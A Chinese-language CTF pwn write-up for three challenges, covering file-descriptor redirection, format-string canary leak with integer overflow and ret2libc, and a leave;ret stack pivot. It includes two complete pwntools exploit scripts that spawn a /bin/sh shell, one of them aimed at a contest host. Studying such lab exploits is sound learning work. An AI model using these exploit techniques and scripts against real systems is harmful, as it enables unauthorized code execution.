
### 第一题

#### 考点：文件描述符，close(1)关闭了文件输出，close(2)关闭了文件错误输出

因为关闭了文件显示但是存在系统调用函数。
直接输入exec 1>&2就行
![[Pasted image 20240910232807.png]]

![[Pasted image 20240910232816.png]]

### 第二题

#### 考点：考察的canary泄露和有符号转无符号导致的整数溢出（ int (-1) --> unsigned int(1) ）

#### 附件：

![[Pasted image 20240923211731.png]]
![[Pasted image 20240923211745.png]]
主函数是第一张图，第二张是get_n的函数，这个函数的作用是输入字符串，atoi函数是将字符串转化为整数，溢出在第二个get_n函数，如果v1是-1的话，v1在主函数声明的是int，但是在get_n的函数里面的是声明的unsigned int，强制转换-1为unsigned int会变成非常大的数。

第三张图里面是一个格式化字符串漏洞。用来泄露canary。

思路是：利用输入的是-1造成整数溢出。然后在泄露canary，然后构造rop泄露基地址，最后调用system。

##### !!!疑问

在构建exp的时候我遇到了一些问题，在发送‘-999’的时候，如果围我用是send()那么我接收不到gift,用的是sendline()的话那就可以得到。

![[Pasted image 20240923211833.png]]

在发送‘|%7$p’的时候，如果围我用是send()那么我接收不到canary,用的是sendline()的话那就可以得到。
![[Pasted image 20240923211757.png]]

还有就是主函数里面的输入函数只有3个，getchar()函数是用来处理换行符的，不是输入的。

atoi函数是将字符串转化为整数（int）的函数。

![[Pasted image 20240923211807.png]]

我在接收泄露的真实地址的时候发现一直接收的是同一个地址，发现不对。经过与exp  
对比后发现是自己粗心，没有将程序中的输出的字符串接收。所以才导致一直是接受的是同一个地址。

只需要在sendline的后面加上recvline就可以将输出的字符串接收就行。然后就发现就可以打通了。


![[Pasted image 20240923211846.png]]


```
from pwn import*
from LibcSearcher import *
p=remote("hnctf.yuanshen.life",34702)
# p=process('./idea')
libc=ELF('./idea')
context(os='linux', arch='i386', log_level='debug')
main=libc.sym['main']
put_plt=libc.plt['puts']
main_got=libc.got['__libc_start_main']
p.recvuntil(b"read? ")
pay=b'-9'
p.sendline(pay)
pay=b"|%7$p"
p.recvuntil(b"gift!\n")
p.sendline(pay)
p.recvuntil(b'|')
canary=int(p.recv(10),16)
print(hex(canary))
pay=flat(b'a'*(0x20),p32(canary),b'a' * 0xc,p32(put_plt),p32(main),p32(main_got))
p.recvuntil(b"data!\n")
p.sendline(pay)

p.recvline()

main_addr=u32(p.recv(4))
Libc = LibcSearcher("__libc_start_main",main_addr)
log.success('leak_atoi_real_addr => {}'.format(hex(main_addr)))

libcbase = main_addr - Libc.dump('__libc_start_main')
system_addr = libcbase + Libc.dump('system')
str_bin_sh = libcbase + Libc.dump('str_bin_sh')

p.recvuntil(b"read? ")
pay=b'-9'
p.sendline(pay)
pay=b"|%7$p"
p.recvuntil(b"gift!\n")
p.sendline(pay)
p.recvuntil(b"data!\n")
pay=flat(b'a'*(0x20),p32(canary),b'a' * 0xc,p32(system_addr),p32(0),p32(str_bin_sh))
p.sendline(pay)
p.interactive()
```



### 第三题

#### 考点：栈溢出至rbp，然后靠函数退出的leave;retn进行栈迁移

#### 附件：

![[../../Pasted image 20250930132314.png]]


![[../../Pasted image 20250930132625.png]]

![[../../Pasted image 20250930131441.png]]

![[../../Pasted image 20250930131534.png]]

![[../../Pasted image 20250930131955.png]]

```
0xffd30358-0xffd30320=0x38
这就是rbp到数据输入的初始地址的距离
```

首先是泄露rbp指向的地址里面的地址，然后布置栈帧

这个题目从反汇编看起来只能溢出到rbp，溢出不到ret
```python
from pwn import *

p = process("./pwn")

leave_ret = 0x08048669

system_addr = 0x08048400

  

p.send(b"a"*0x2B+b'b')

p.recvuntil(b'b')

ebp_addr = u32(p.recv(4))

print(hex(ebp_addr))

stack = ebp_addr-0x38

  

payload = p32(0xdeadbeef)+p32(system_addr)+p32(0xdeadbeef)+p32(stack+0x10)+b"/bin/sh\x00"

payload = payload.ljust(0x2C,b'a')

payload += p32(stack)+p32(leave_ret)

p.send(payload)

p.interactive()

  

"""

1.为什么要用 send 发送最后的 b? 为什么sendline 不行？
![[../../待整理文件/send_and_sendline|send_and_sendline]]

2.为什么能够接收 rbp 的值,这个值是指什么？
got it，打印出来的是rbp指向地址中的地址
3.栈的距离怎么算的？为什么是 0x38?
got it,如上图栈空间计算

"""
```

```markdown
​
4.为什么 system 的地址要用plt 表，为什么直接用 system 地址不行？

1. call system指令的本质是 “带上下文的调用”​
   
- 该call指令的下一条指令（add esp, 4）会在调用结束后修正栈指针,如果你直接跳转到这个call_system指令的地址，程序会执行这次调用，但此时栈上的参数是原程序的参数（可能不是你想要的/bin/sh），且调用结束后会按照原程序的逻辑继续执行（add esp, 4等），无法控制后续流程。​

2. PLT 表地址是system函数的 “纯净入口”​

- 调用system@plt时，参数需要由攻击者自己控制（按照 C 语言函数调用约定，参数需要压在栈上，位于返回地址之后）。这意味着你可以在栈上构造/bin/sh字符串的地址作为参数，让system执行你想要的命令。​

1. 动态链接的 “重定位” 特性
- 而程序中已有的call_system指令，其本质是对system@plt的一次调用（汇编层面可能直接编码为call system@plt），但它本身是一个固定的指令地址，不具备 “找到system实际地址” 的能力 —— 你跳转到这个call指令，本质上还是间接依赖 PLT 表，但多了一层不必要的上下文限制。​

总结​
- 直接跳转到call system指令，相当于 “借用” 程序中已有的一次system调用，但你无法自由控制参数和后续流程；​

- 跳转到system@plt，相当于 “直接调用system函数”，你可以完全控制参数（比如传入/bin/sh）和执行流程，这正是 PWN 攻击需要的。​
```

